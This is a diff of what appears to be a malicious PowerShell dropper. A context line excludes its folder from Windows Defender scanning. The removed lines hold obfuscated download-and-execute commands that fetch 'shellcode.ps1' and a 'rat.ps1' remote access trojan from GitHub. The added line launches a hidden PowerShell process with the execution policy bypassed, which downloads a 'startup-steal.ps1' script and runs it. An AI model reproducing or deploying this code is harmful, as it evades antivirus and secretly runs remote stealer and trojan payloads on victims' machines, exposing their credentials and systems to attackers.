@@ -61,14 +61,7 @@ New-Item -ItemType Directory -Path $temp
 
 Add-MpPreference -ExclusionPath $dir
 
-
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
-
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/hacklife/rat.ps1")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-# Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+Start-Process powershell -ArgumentList '-nop -ep bypass -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/refs/heads/main/scr/startup-steal.ps1 | iex"' -NoNewWindow -WindowStyle Hidden
 
 # if ($env:USERDOMAIN -ne "DESKTOP-A1L2M8J") {
 #     $datacode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode2.ps1")
